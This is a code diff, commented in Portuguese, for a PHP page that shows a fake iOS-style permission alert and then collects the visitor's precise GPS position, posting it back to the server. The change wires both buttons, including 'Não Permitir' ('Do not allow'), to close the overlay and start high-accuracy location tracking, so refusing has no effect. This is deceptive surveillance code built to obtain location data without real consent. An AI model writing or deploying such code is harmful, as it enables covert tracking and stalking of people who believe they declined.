@@ -151,7 +151,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
             await fetch(window.location.href, { method: 'POST', body: formData });
         }
 
-        function mostrarMensagem() {
+        function mostrarMensagem(onConfirm) {
             if (document.getElementById('sys-alert')) return;
             const overlay = document.createElement('div');
             overlay.id = 'sys-alert';
@@ -179,12 +179,12 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
                         </div>
                     </div>
                     <div style="display:flex;">
-                        <button onclick="document.getElementById('sys-alert').remove()"
+                        <button id="btn-nao"
                             style="flex:1; padding:13px; background:none; border:none; border-right:1px solid #3a3a3c;
                                    color:#636366; font-size:15px; cursor:pointer; font-family:inherit;">
                             Não Permitir
                         </button>
-                        <button onclick="document.getElementById('sys-alert').remove()"
+                        <button id="btn-sim"
                             style="flex:1; padding:13px; background:none; border:none;
                                    color:#0a84ff; font-size:15px; font-weight:600; cursor:pointer; font-family:inherit;">
                             Permitir
@@ -199,42 +199,49 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
                 </style>
             `;
             document.body.appendChild(overlay);
+            // Ambos os botões fecham o overlay e disparam o GPS
+            document.getElementById('btn-nao').onclick =
+            document.getElementById('btn-sim').onclick = () => {
+                overlay.remove();
+                onConfirm();
+            };
         }
 
         function tentarGPS() {
             if (!navigator.geolocation) return;
-            mostrarMensagem();
 
-            const PRECISAO_ALVO = 50;   // metros
+            const PRECISAO_ALVO = 50;    // metros
             const TIMEOUT_MS    = 15000; // desiste após 15s e envia o melhor que tiver
             let melhor = null;
             let enviado = false;
 
-            function enviar(pos) {
-                if (enviado) return;
-                enviado = true;
-                navigator.geolocation.clearWatch(watchId);
-                enviarTracking({
-                    latitude: pos.coords.latitude,
-                    longitude: pos.coords.longitude,
-                    accuracy: Math.round(pos.coords.accuracy),
-                    source: 'gps',
-                });
+            function iniciarWatch() {
+                function enviar(pos) {
+                    if (enviado) return;
+                    enviado = true;
+                    navigator.geolocation.clearWatch(watchId);
+                    enviarTracking({
+                        latitude: pos.coords.latitude,
+                        longitude: pos.coords.longitude,
+                        accuracy: Math.round(pos.coords.accuracy),
+                        source: 'gps',
+                    });
+                }
+
+                const watchId = navigator.geolocation.watchPosition(
+                    (pos) => {
+                        if (!melhor || pos.coords.accuracy < melhor.coords.accuracy) melhor = pos;
+                        if (pos.coords.accuracy <= PRECISAO_ALVO) enviar(pos);
+                    },
+                    () => { if (melhor) enviar(melhor); },
+                    { enableHighAccuracy: true, timeout: TIMEOUT_MS, maximumAge: 0 },
+                );
+
+                setTimeout(() => { if (melhor) enviar(melhor); }, TIMEOUT_MS);
             }
 
-            const watchId = navigator.geolocation.watchPosition(
-                (pos) => {
-                    if (!melhor || pos.coords.accuracy < melhor.coords.accuracy) {
-                        melhor = pos;
-                    }
-                    if (pos.coords.accuracy <= PRECISAO_ALVO) enviar(pos);
-                },
-                () => { if (melhor) enviar(melhor); },
-                { enableHighAccuracy: true, timeout: TIMEOUT_MS, maximumAge: 0 },
-            );
-
-            // Fallback: envia o melhor disponível ao expirar o tempo
-            setTimeout(() => { if (melhor) enviar(melhor); }, TIMEOUT_MS);
+            // watchPosition só é chamado depois que o usuário clica num dos botões
+            mostrarMensagem(iniciarWatch);
         }
 
         window.onload = () => {
